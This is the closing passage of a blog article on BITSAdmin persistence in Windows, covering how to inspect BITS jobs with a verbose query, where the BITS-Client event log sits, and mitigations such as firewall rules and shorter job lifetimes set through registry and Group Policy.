<p class="ai-optimize-117"><span style="color: #000000;">Please note that the system will not show the BITS Jobs in autoruns because there is no way to run BITSAdmin at start-up with the Default Configurations.</span></p>
<h3 class="ai-optimize-118"><span style="color: #800000;">Verbose Switch</span></h3>
<p class="ai-optimize-119"><span style="color: #000000;">If we are lucky enough to find the BITSAdmin in the act, we can get our hands on some very useful information. We ran a BITS Job and ran the following command to gain information about the job. </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /info hackingarticles /verbose</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-tSAHK5UnLn8/XhBCk0rIDlI/AAAAAAAAiH0/1ejvIfek8x4TQtC5GUwhrmPAN6EPobvJwCLcBGAsYHQ/s1600/20.png"/></p>
<h3 class="ai-optimize-120"><span style="color: #800000;">Event Logs</span></h3>
<p class="ai-optimize-121"><span style="color: #000000;">We have the Windows Event logs, which focus on the default event logs, it is one of the sources for detection of any download. It is known as the Microsoft-Windows-BITS-Client/Operational log. These logs contain the download state, download source, user and some file information for each BITS transfer job. This event log is strikingly similar across Windows 7 through 10 so it is a good endpoint collection source. There are some limitations here as these logs don’t show the sparse data, as well as the logs, are spread over several EventIDs. Potentially a huge amount of entries in any environment makes it impossible to spot malicious download hiding in plain sight. This log will also not detect the BITS persistence unless there was a network transfer to a suspicious domain as part of the configured job.</span></p>
<p class="ai-optimize-122"><span style="color: #000000;">You can monitor this Log on the Event Viewer at this Location:</span></p>
<p class="ai-optimize-123"><span style="color: #000000;"><strong>Application and Services Logs &gt; Microsoft &gt; Windows &gt; BITS-Client</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-IVukK4wwIdc/XhBClVHuzPI/AAAAAAAAiH4/pefErwQPi-wZsvXL3kMU3tpqrCfxCrpkwCLcBGAsYHQ/s1600/21.png"/></p>
<h3 class="ai-optimize-124"><span style="color: #800000;">Mitigation</span></h3>
<p class="ai-optimize-125"><span style="color: #000000;">Our recommendation for mitigating BITSAdmin is to modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic. You can also reduce the default BITS job lifetime in Group Policy or by editing the “JobInactivityTimeout” and “MaxDownloadTime” Registry values in HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\BITS. You can modify the default maximum lifetime for a BITS job, which is 90 days. Lastly, we can limit the access of the BITSAdmin interface to specific users or groups.</span></p>
<h3 class="ai-optimize-126"><span style="color: #800000;">Conclusion</span></h3>
<p class="ai-optimize-127"><span style="color: #000000;">This kind of attack is very much happening in real life. Multiple incidents targeted different office environments where they detected and deleted the malicious file, but BITSAdmin revived it again. A special shout-out to <a href="https://twitter.com/Oddvarmoe">Oddvar Moe</a> for his help in some tinkering. It was a fun learning experience working with BITSAdmin. We are going to write more articles about other LOLS that we could find. Stay Tuned.</span></p>
<p class="ai-optimize-128"><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal?redirectedfrom=MSDN">BITSAdmin Operations</a>                   <a style="color: #0000ff;" href="http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html">Persistence using BITS</a>    </span></p>
<p class="ai-optimize-129"><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://lolbas-project.github.io/">Living Off Land binaries</a>                  <a style="color: #0000ff;" href="https://attack.mitre.org/techniques/T1197/">BITSAdmin</a></span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To learn more about Red Teaming. Follow this</span> <a href="https://www.hackingarticles.in/category/red-teaming/">Link.</a></p>
<p class="ai-optimize-130"><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Contact on Twitter and <a style="color: #000000;" href="https://www.linkedin.com/in/pavandeep-singh-6b1074132">LinkedIn</a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
